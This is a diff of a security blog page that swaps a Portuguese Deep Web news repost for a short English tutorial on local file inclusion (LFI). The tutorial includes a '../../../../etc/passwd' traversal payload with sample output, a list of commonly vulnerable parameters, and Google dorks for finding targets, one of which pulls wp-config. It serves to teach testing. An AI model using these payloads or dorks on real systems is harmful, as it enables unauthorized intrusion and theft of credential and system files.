@@ -11,7 +11,7 @@
 
   <title>
     
-      Deep Web: o que se esconde no submundo da internet &middot; bt0
+      LFI Parameters List &middot; bt0
     
   </title>
 
@@ -114,48 +114,96 @@
 
     <div class="content container">
       <div class="post">
-  <h1 class="post-title">Deep Web: o que se esconde no submundo da internet</h1>
-  <span class="post-date">22 Jul 2019</span>
-  <p>A internet profunda, ou “Deep Web“, esse enorme espaço virtual que foge ao controle da Justiça convencional e que seria 400 vezes maior do que a internet comum, esconde um mundo de atividades criminosas que buscam anonimato, enquanto aumentam as práticas ilícitas.<!--more--></p>
+  <h1 class="post-title">LFI Parameters List</h1>
+  <span class="post-date">16 Feb 2021</span>
+  <h2 id="lfi-local-file-inclusion">LFI (Local File Inclusion)</h2>
 
-<p>Recentemente divulgado, um relatório da Trend Micro intitulado “Abaixo da superfície: exploração da Deep Web” revelou que mais de 25% das buscas entre a Deep Web e a internet padrão são com fins de exploração infantil e pornografia.</p>
+<p>Local file inclusion (also known as LFI) is the process of including files, that are already locally present on the server, through the exploiting of vulnerable inclusion procedures implemented in the application. This vulnerability occurs, for example, when a page receives, as input, the path to the file that has to be included and this input is not properly sanitized, allowing directory traversal characters (such as dot-dot-slash) to be injected. Although most examples point to vulnerable PHP scripts, we should keep in mind that it is also common in other technologies such as JSP, ASP and others. [1]
+<!--more--></p>
 
-<p>Outro dado destacado pela empresa especializada em segurança online é o preço de US$ 180 mil cobrado por esses sites secretos para assassinar uma personalidade ou político.</p>
+<script async="" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
 
-<p>Para obter informações desta rede inacessível através de navegadores comuns, como o Chrome e o Internet Explorer, e aparentemente invencível, a equipe da Trend Micro utilizou um sistema chamado Analisador de Deep Web (DeWa).</p>
+<p><ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-5149953309426611" data-ad-slot="3196203233"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script></p>
 
-<p>O DeWa reúne as URLs ligadas à “Dark Web”, a pior parte da “Deep Web”, incluindo Tor, sites I2P (Invisible Internet Project) e os identificadores de recursos Freenet, para extrair dados relevantes vinculados a eles, como conteúdo, links e endereço de e-mail.</p>
+<p>Example of test:</p>
 
-<p>Este sistema também alerta sobre o aumento do tráfego de informação e seus sites, algo especialmente útil quando se buscam novas famílias de “malware”, os softwares maliciosos destinados a invadir um sistema de computador alheio de forma ilícita.</p>
+<p>Consider the URL</p>
 
-<p>As drogas brandas, especialmente maconha, são a mercadoria mais vendida neste ambiente online, que não é encontrado em buscadores tradicionais como o Google.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> http://vulnerable_host/preview.php?file=example.html
+</code></pre></div></div>
 
-<p>Ao todo, 32% dos itens comercializados nas 15 maiores lojas da “Deep Web” têm relação com a cannabis. Em seguida aparecem produtos como Ritalina e Xanax, mais conhecido como Alprazolam, medicamentos pesados e de venda controlada.</p>
+<p>The parameter file= could be exploited to point it to another file within the server</p>
 
-<p>Nessa terra sem lei, também é possível conseguir a cidadania americana. Sites especializados criam passaportes por US$ 5.900 (R$ 20.390).</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> http://vulnerable_host/preview.php?file=../../../../etc/passwd
+</code></pre></div></div>
 
-<p>A compra de uma conta roubada do eBay ou do PayPal em uma das lojas do submundo online custa US$ 110 (R$ 380). De acordo com o relatório, 34% das URLs ou endereços eletrônicos que contêm “malware” na internet do usuário comum têm conexões com a internet profunda.</p>
+<p>The expected result is shown below:</p>
 
-<p>O analista David Sancho, pesquisador da Trend Micro na área de “Deep Web”, explicou à Agência Efe que, quando se fala do volume de atividade nesse mundo cada vez “mais popular” não se leva em conta apenas o total de páginas hospedadas, mas também o número de serviços ocultos. Eles podem disseminar informação ilegal ou proibida, como terrorismo e atividades da máfia, além de comercializar armas.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> root:x:0:0:root:/root:/bin/bash
+ bin:x:1:1:bin:/bin:/sbin/nologin
+ daemon:x:2:2:daemon:/sbin:/sbin/nologin
+ alex:x:500:500:alex:/home/alex:/bin/bash
+ margo:x:501:501::/home/margo:/bin/bash
+ ...
+</code></pre></div></div>
 
-<p>Segundo o relatório, a maior parte disparada das URLs da “Deep Web” está em russo (41.40%) e inglês (40.74%). Em português, há 1,25% das páginas.</p>
+<p>There is a list of most common parameters to test for LFI</p>
 
-<p>Fonte: http://exame.abril.com.br/tecnologia/noticias/deep-web-o-que-se-esconde-no-submundo-da-internet</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ?cat=
+ ?dir=
+ ?action=
+ ?board=
+ ?date=
+ ?detail=
+ ?file=
+ ?download=
+ ?path=
+ ?folder=
+ ?prefix=
+ ?include=
+ ?page=
+ ?inc=
+ ?locate=
+ ?show=
+ ?doc=
+ ?site=
+ ?type=
+ ?view=
+ ?content=
+ ?document=
+ ?layout=
+ ?mod=
+ ?conf=
+</code></pre></div></div>
+
+<p>You can use Google Hacking and dorks to find vulnerable targets like:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> inurl:"wp-license.php?file=../..//wp-config"
+</code></pre></div></div>
+
+<p>File contain password and directory traversal vulnerability [2]</p>
+
+<p>Using the same strategy to exploit wordpress and retrieve the wp-config, you could use all those parameters above and create your own Google Hacking Dork to analyze your target.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> inurl:"?cat=" site:"example.com" 
+</code></pre></div></div>
+
+<p>References:</p>
+
+<p>[1] <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion">OWASP TOP 10 - LFI</a></p>
+
+<p>[2] <a href="https://www.exploit-db.com/ghdb/4940">GHDB</a></p>
+
+<p>Thanks for following!</p>
 
 </div>
 
 <div class="related">
   <h2>Related Posts</h2>
   <ul class="related-posts">
-    
-      <li>
-        <h3>
-          <a href="/infosec/2021/02/16/lfi-parameters.html">
-            LFI Parameters List
-            <small>16 Feb 2021</small>
-          </a>
-        </h3>
-      </li>
     
       <li>
         <h3>
@@ -171,6 +219,15 @@
           <a href="/infosec/2020/02/11/osint-repository.html">
             OSINT - Some Repositories and Tools
             <small>11 Feb 2020</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/infosec/2020/01/29/writeup-vulnhub-five86-1.html">
+            Writeup - Vulnhub machine - Five86-1
+            <small>29 Jan 2020</small>
           </a>
         </h3>
       </li>
